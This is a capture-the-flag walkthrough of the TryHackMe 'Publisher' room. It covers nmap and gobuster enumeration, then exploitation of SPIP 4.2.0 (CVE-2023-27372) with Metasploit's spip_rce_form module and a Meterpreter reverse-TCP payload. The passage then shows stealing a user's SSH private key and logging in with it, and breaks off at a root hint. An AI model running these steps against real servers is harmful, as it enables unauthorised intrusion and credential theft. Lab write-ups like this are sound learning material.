# TRYHACKME : Publisher
A CMS hacking that is SPIP
# NMAP SCAN
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 df:72:2e:fa:7a:a4:12:52:a0:dc:c9:48:7c:63:48:d7 (RSA)
|   256 99:77:75:a6:cb:28:3a:43:fa:39:7e:9b:74:a1:90:92 (ECDSA)
|_  256 ce:93:ac:81:9d:a9:69:05:52:3a:1b:1d:aa:f2:85:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# PORT 80

First let's run some basic dir fuzzing:
## GOBUSTER
```
/images               (Status: 301) [Size: 315] [--> http://10.201.68.178/images/]
/spip                 (Status: 301) [Size: 313] [--> http://10.201.68.178/spip/]      
```

## Searchsploit
After the enumeration of the cms version, let's look for available exploit of the following version:\
```
$ searchsploit 'spip 4.2.0'
-------------------------------------- ---------------------------------
 Exploit Title                        |  Path
-------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution ( | php/webapps/51536.py
-------------------------------------- ---------------------------------
Shellcodes: No Results

```
Let's look further about the vulnerability.
```
$ searchsploit -x 51536    
  Exploit: SPIP v4.2.0 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/51536
     Path: /usr/share/exploitdb/exploits/php/webapps/51536.py
    Codes: CVE-2023-27372
 Verified: True
File Type: Python script, ASCII text executable
```
Look up [CVE-2023-27372](https://packetstorm.news/tos/aHR0cHM6Ly9wYWNrZXRzdG9ybS5uZXdzL2ZpbGVzLzE3MTkyMS9TUElQLVJlbW90ZS1Db21tYW5kLUV4ZWN1dGlvbi5odG1sIDE3NTQ3Mjk1NTggMDFkMjMyZGJjOWNjYzk4ZGE5NjU3YjUwYjdlYzcwMmRlNmE1MGFkZGI1NDM0Y2IzZWVhMzBjYTY5NzI1NWQ5ZA==). This one can be used for Metasploit.

## Metasploit
Let's proceed to use metasploit for exploitation
```
$ msfpsloit -q
...
> search spip
...
> use 12           // use the one with "spip_rce_form"

```

Set the options into the following:
```
msf6 exploit(multi/http/spip_rce_form) > options

Module options (exploit/multi/http/spip_rce_form):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:po
                                         rt[,type:host:port][...]
   RHOSTS     [TARGET-IP]    yes       The target host(s), see https://docs
                                         .metasploit.com/docs/using-metasploi
                                         t/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing conne
                                         ctions
   TARGETURI  /spip            yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  [MACHINE-IP]      yes       The listen address (an interface may be
                                     specified)
   LPORT  4444             yes       The listen port

```
 Then run the exploit.

### Meterpreter
Type the following commands:
```
> shell
pwd
cd /home/think
cat user.txt
[RETRIEVE FLAG]
```

# PRIVILEGE ESCALATION
From the same "/home/think" directory, proceed to the ".ssh" directory.

We can access and download the private and public key for the ssh.

```
> download id_rsa
```

Go back to your main terminal, and change the id_rsa file permission:
```
chmod 600 id_rsa
```

## SSH
Escalate privilege through the leaked private ssh key of user Think:
```
$ ssh think@10.201.103.88 -i id_rsa
```
We still need to further escalate our privileges by getting into root.
Let's find other flaws to the system.

## ROOT Access
According to the room "exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation." This will serve as a clue.
